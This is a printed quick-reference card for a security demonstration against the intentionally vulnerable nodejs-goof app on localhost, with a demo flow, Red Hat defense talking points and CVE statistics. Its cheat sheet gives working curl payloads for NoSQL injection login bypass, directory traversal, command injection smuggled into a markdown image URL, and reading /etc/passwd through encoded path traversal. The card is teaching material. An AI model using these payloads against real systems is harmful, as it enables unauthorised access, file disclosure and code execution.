╔══════════════════════════════════════════════════════════════════════════╗
║                    VULNERABILITY DEMO - QUICK REFERENCE                  ║
║                   Red Hat Cybersecurity Engineering                      ║
╚══════════════════════════════════════════════════════════════════════════╝

┌──────────────────────────────────────────────────────────────────────────┐
│ 🚀 LAUNCH DEMO                                                           │
├──────────────────────────────────────────────────────────────────────────┤
│ cd /Users/bigmac/Documents/workspace/agbonjaru/personal/projects/        │
│    nodejs-goof                                                            │
│ ./attack-menu.sh                                                         │
└──────────────────────────────────────────────────────────────────────────┘

┌──────────────────────────────────────────────────────────────────────────┐
│ ⚡ TOP 5 MOST IMPRESSIVE ATTACKS                                         │
├──────────────────────────────────────────────────────────────────────────┤
│ [1] NoSQL Injection       → Auth bypass in 3 ways                       │
│ [4] Command Injection     → Remote code execution (RCE)                 │
│ [5] Prototype Pollution   → Privilege escalation                        │
│ [2] Directory Traversal   → Read any file on system                     │
│ [9] Info Disclosure       → Read /etc/passwd via URL encoding           │
└──────────────────────────────────────────────────────────────────────────┘

┌──────────────────────────────────────────────────────────────────────────┐
│ 📋 MANUAL COMMAND CHEAT SHEET                                            │
├──────────────────────────────────────────────────────────────────────────┤
│                                                                          │
│ NoSQL Injection (Authentication Bypass):                                │
│ curl -X POST http://localhost:3001/login \                              │
│   -H 'Content-Type: application/json' \                                 │
│   -d '{"username": "admin@snyk.io", "password": {"$gt": ""}}'           │
│                                                                          │
│ Directory Traversal (Read package.json):                                │
│ curl -X POST http://localhost:3001/login -c /tmp/cookies.txt \          │
│   -H 'Content-Type: application/json' \                                 │
│   -d '{"username": "admin@snyk.io", "password": {"$gt": ""}}'           │
│ curl -X POST http://localhost:3001/account_details \                    │
│   -b /tmp/cookies.txt -H 'Content-Type: application/json' \             │
│   -d '{"email": "admin@snyk.io", "firstname": "admin",                  │
│        "lastname": "admin", "country": "IL",                             │
│        "phone": "+972551234123", "layout": "./../package.json"}'        │
│                                                                          │
│ Command Injection (RCE):                                                │
│ curl -X POST http://localhost:3001/create \                             │
│   -H 'Content-Type: application/x-www-form-urlencoded' \                │
│   -d 'content=![alt text](https://x.com/i.png;touch /tmp/pwned "x")'    │
│                                                                          │
│ Read /etc/passwd:                                                       │
│ curl 'http://localhost:3001/public/%2e%2e/%2e%2e/%2e%2e/etc/passwd'     │
│                                                                          │
└──────────────────────────────────────────────────────────────────────────┘

┌──────────────────────────────────────────────────────────────────────────┐
│ 🎯 DEMO FLOW (15 MIN)                                                    │
├──────────────────────────────────────────────────────────────────────────┤
│ 1. Launch: ./attack-menu.sh                                             │
│ 2. [C] Check Status                                                     │
│ 3. [1] NoSQL Injection - Bypass authentication                          │
│ 4. [2] Directory Traversal - Read package.json                          │
│ 5. [5] Prototype Pollution - Privilege escalation                       │
│ 6. [4] Command Injection - Prove RCE                                    │
│ 7. [10] Vulnerability Scan - Show 138 vulnerabilities                   │
│ 8. Discuss Red Hat defensive strategies                                 │
└──────────────────────────────────────────────────────────────────────────┘

┌──────────────────────────────────────────────────────────────────────────┐
│ 💬 KEY TALKING POINTS                                                    │
├──────────────────────────────────────────────────────────────────────────┤
│ • "These are real attacks used in the wild, not theoretical"            │
│ • "138 vulnerabilities across the dependency tree"                      │
│ • "Defense in depth: validation + encoding + WAF + monitoring"          │
│ • "Red Hat: SELinux + SCAP + Container security"                        │
│ • "Shift-left: catch vulnerabilities in development"                    │
└──────────────────────────────────────────────────────────────────────────┘

┌──────────────────────────────────────────────────────────────────────────┐
│ 🛠️ TROUBLESHOOTING                                                       │
├──────────────────────────────────────────────────────────────────────────┤
│ App not responding:                                                     │
│   pkill -f "node app.js" && npm start &                                 │
│                                                                          │
│ MongoDB not running:                                                    │
│   docker run -d -p 27017:27017 --name goof-mongo mongo:3                │
│                                                                          │
│ Check app status:                                                       │
│   curl -I http://localhost:3001                                         │
│                                                                          │
│ Reset cookies:                                                          │
│   rm /tmp/goof_cookies.txt                                              │
└──────────────────────────────────────────────────────────────────────────┘

┌──────────────────────────────────────────────────────────────────────────┐
│ 📚 DOCUMENTATION                                                         │
├──────────────────────────────────────────────────────────────────────────┤
│ attack-menu.sh              → Interactive menu (main tool)              │
│ ATTACK_REFERENCE.md         → Full technical guide                      │
│ REVERSE_CAREER_FAIR_DEMO.md → Presentation materials                    │
│ README_DEMO.md              → Setup & quick start                       │
│ QUICK_REFERENCE.txt         → This file (print & bring!)                │
└──────────────────────────────────────────────────────────────────────────┘

┌──────────────────────────────────────────────────────────────────────────┐
│ 📊 VULNERABILITY STATS                                                   │
├──────────────────────────────────────────────────────────────────────────┤
│ Total: 138 vulnerabilities                                              │
│   🔴 Critical:  36                                                      │
│   🟠 High:      65                                                      │
│   🟡 Moderate:  28                                                      │
│   🔵 Low:        9                                                      │
│                                                                          │
│ Top CVEs:                                                               │
│   • CVE-2019-2391: Mongoose buffer exposure                             │
│   • CVE-2017-16119: Express misconfiguration                            │
│   • CVE-2017-17461: Marked XSS                                          │
│   • CVE-2015-8858: ST directory traversal                               │
│   • CVE-2019-10744: Lodash prototype pollution                          │
└──────────────────────────────────────────────────────────────────────────┘

┌──────────────────────────────────────────────────────────────────────────┐
│ ✅ PRE-DEMO CHECKLIST                                                    │
├──────────────────────────────────────────────────────────────────────────┤
│ □ App running (curl -I http://localhost:3001)                           │
│ □ MongoDB container active (docker ps | grep mongo)                     │
│ □ attack-menu.sh is executable (chmod +x)                               │
│ □ Browser open for visual confirmation                                  │
│ □ Terminal sized for audience visibility                                │
│ □ This quick reference printed/accessible                               │
│ □ Practiced demo at least 2x                                            │
└──────────────────────────────────────────────────────────────────────────┘

┌──────────────────────────────────────────────────────────────────────────┐
│ 🎓 RED HAT DEFENSES TO MENTION                                           │
├──────────────────────────────────────────────────────────────────────────┤
│ SELinux: Mandatory access control - confines compromised processes      │
│ Firewalld: Network segmentation - limit attack surface                  │
│ SCAP/OpenSCAP: Compliance automation - STIG/PCI-DSS/HIPAA               │
│ Podman/OpenShift: Container security - image scanning, policies         │
│ Red Hat Insights: Proactive vulnerability detection                     │
│ FIPS 140-2: Cryptographic validation                                    │
└──────────────────────────────────────────────────────────────────────────┘

GOOD LUCK WITH YOUR DEMO! 🚀🔒
